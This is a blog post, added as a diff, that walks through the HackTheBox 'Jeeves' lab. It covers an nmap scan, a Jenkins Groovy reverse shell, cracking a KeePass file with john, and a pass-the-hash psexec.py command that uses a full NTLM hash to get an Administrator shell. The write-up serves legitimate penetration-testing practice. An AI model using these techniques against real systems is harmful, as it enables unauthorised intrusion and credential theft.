@@ -1,0 +1,105 @@
+---
+layout: post
+title:  "HackTheBox - Jeeves"
+date:   2021-08-05 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: Ask Jeeves
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 4h59m56s, deviation: 0s, median: 4h59m56s
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-04T22:15:29
+|_  start_date: 2021-08-04T22:14:25
+```
+We find a directory /askjeeves in port 50000 and we open to see it is running jenkins version 2.87
+
+# FOOTHOLD
+
+Going to Manage Jenkins we see that we can run a groovy script in script console so we try a [groovy reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy). And we get a shell back.
+
+We find the user flag in c:\Users\kohsuke\user.txt
+
+# PRIVILEGE ESCALATION
+
+Since my reverse shell was going away every so often and almost no command was running I decided to upgrade to powershell (I still kept losing the shell every 5 mins) 
+[Basic Powershell](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
+
+And uploaded winpeas and ran it to find possible ways of privilege escalation. It shows that there is one CEH.kdbx file in kohsuke's Documents directory. So I uploaded nc.exe (after spending a lot of time searching how to transfer files imagine my feelings when I found out there is just one nc.exe file which can run on windows) and downloaded CEH.kdbx
+
+Since it is encrypted we use keepass2john and crack the hash using john the ripper:
+
+```s
+john --wordlist=rockyou.txt hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moonshine1       (CEH)
+1g 0:00:00:15 DONE (2021-08-05 00:12) 0.06468g/s 3556p/s 3556c/s 3556C/s nichole2..monyong
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+And we get in and grab a hash:
+
+```
+aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+```
+We get Administrator shell via psexec.py
+
+```s
+python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.10.10.63
+```
+BUT THEN , WHERE THE FLAG SHOULD BE THERE , I FOUND THIS !!!!
+```
+C:\Users\Administrator\Desktop>more hm.txt
+more hm.txt
+The flag is elsewhere.  Look deeper.
+```
+One of my friends had the idea that it might be hidden , AND IT WAS :
+
+```s
+C:\Users\Administrator\Desktop>dir /R
+dir /R
+ Volume in drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   7,377,772,544 bytes free
+
+c:\Users\Administrator\Desktop>more < hm.txt:root.txt
+
+```
+
